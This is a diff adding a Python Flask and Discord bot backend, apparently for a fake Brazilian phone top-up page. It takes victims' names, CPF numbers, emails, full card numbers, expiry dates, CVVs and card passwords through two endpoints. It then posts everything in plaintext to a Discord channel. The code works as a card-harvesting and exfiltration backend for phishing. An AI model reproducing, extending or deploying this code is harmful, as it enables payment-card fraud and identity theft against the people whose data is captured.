@@ -1,0 +1,148 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import threading
+import asyncio
+
+# --- Flask App and Discord Bot Initialization ---
+app = Flask(__name__)
+
+# --- Configuration from Environment Variables ---
+BOT_TOKEN = os.getenv("TOKEN")
+# The ID of the Discord channel where messages will be sent
+CHANNEL_ID = int(os.getenv("CHANNEL_ID", "0"))
+
+# --- Discord Bot Setup ---
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# In-memory list to store card data temporarily
+# NOTE: This data will be lost if the application restarts.
+cards: list[Card] = []
+
+
+# --- API Endpoints ---
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    """Receives initial card and user data."""
+    try:
+        data = request.json
+
+        required_keys = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf',
+            'card', 'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        # Create a Card object and add it to our in-memory list
+        card_instance = Card(
+            data['celular'], data['operadora'], data['valor'], data['email'],
+            data['nome'], data['cpf'], data['card'], data['mes'],
+            data['ano'], data['cvv'], data['token'], data['bin'], data['dadosbin']
+        )
+        cards.append(card_instance)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /auth: {ex}")
+        return jsonify({'Error': 'An internal server error occurred'}), 500
+
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    """Receives the final password and triggers the Discord notification."""
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        card_to_process = None
+        # Find the matching card data using the unique token
+        for card in cards:
+            if card.token == token:
+                card_to_process = card
+                break
+
+        if card_to_process:
+            channel = bot.get_channel(CHANNEL_ID)
+            if channel:
+                # Prepare a rich message (embed) for Discord
+                embed = discord.Embed(
+                    title="✅ Nova Transação Recebida",
+                    description="Dados completos da transação e do cliente.",
+                    color=discord.Color.green()
+                )
+                embed.add_field(name="👤 Cliente", value=f"**Nome:** `{card_to_process.nome}`\n**CPF:** `{card_to_process.cpf}`\n**Email:** `{card_to_process.email}`", inline=False)
+                embed.add_field(name="📞 Recarga", value=f"**Celular:** `{card_to_process.celular}`\n**Operadora:** `{card_to_process.operadora}`\n**Valor:** `R$ {card_to_process.valor}`", inline=False)
+                embed.add_field(name="💳 Cartão", value=f"**Número:** `{card_to_process.card}`\n**Validade:** `{card_to_process.mes}/{card_to_process.ano}`\n**CVV:** `{card_to_process.cvv}`", inline=False)
+                embed.add_field(name="🔑 Senha do Cartão", value=f"**`{senha}`**", inline=False)
+                embed.set_footer(text=f"Token da Transação: {card_to_process.token}")
+
+                # Since this is a sync function (Flask), we must schedule the async
+                # discord.py function on the bot's event loop.
+                asyncio.run_coroutine_threadsafe(channel.send(embed=embed), bot.loop)
+
+                # Remove the card from the list to prevent re-processing
+                cards.remove(card_to_process)
+                return jsonify({'Message': 'Ok'}), 200
+            else:
+                print(f"Error: Discord channel with ID {CHANNEL_ID} not found.")
+                return jsonify({'Error': 'Server configuration error: Discord channel not found'}), 500
+        else:
+            # No card was found for the provided token
+            return jsonify({'Error': 'Invalid or expired token'}), 404
+
+    except Exception as ex:
+        print(f"Error in /authpass: {ex}")
+        return jsonify({'Error': 'An internal server error occurred'}), 500
+
+
+# --- Discord Bot Events ---
+
+@bot.event
+async def on_ready():
+    """Event that runs when the bot has successfully connected to Discord."""
+    print("=" * 40)
+    print(f"Bot logged in as: {bot.user.name} ({bot.user.id})")
+    print(f"Ready to send messages to Channel ID: {CHANNEL_ID}")
+    print("=" * 40)
+
+
+# --- Application Runner ---
+
+def run_flask_app():
+    """Runs the Flask web server."""
+    # Note: For production, consider using a WSGI server like Gunicorn or Waitress.
+    app.run(host="0.0.0.0", port=5000, debug=False)
+
+
+if __name__ == "__main__":
+    # Check for required environment variables before starting
+    if not BOT_TOKEN:
+        print("FATAL ERROR: The 'TOKEN' environment variable for the Discord bot is not set.")
+    elif not CHANNEL_ID:
+        print("FATAL ERROR: The 'CHANNEL_ID' environment variable for the Discord bot is not set.")
+    else:
+        # Run the Flask app in a separate background thread.
+        # 'daemon=True' ensures the thread will close when the main program exits.
+        flask_thread = threading.Thread(target=run_flask_app, daemon=True)
+        flask_thread.start()
+        print("Flask server has started in a background thread.")
+
+        # Run the Discord bot in the main thread.
+        # This will block until the bot is disconnected.
+        print("Starting Discord bot...")
+        try:
+            bot.run(BOT_TOKEN)
+        except discord.errors.LoginFailure:
+            print("FATAL ERROR: Login failed. The provided Discord bot token is incorrect.")
+        except Exception as e:
+            print(f"An error occurred while running the bot: {e}")
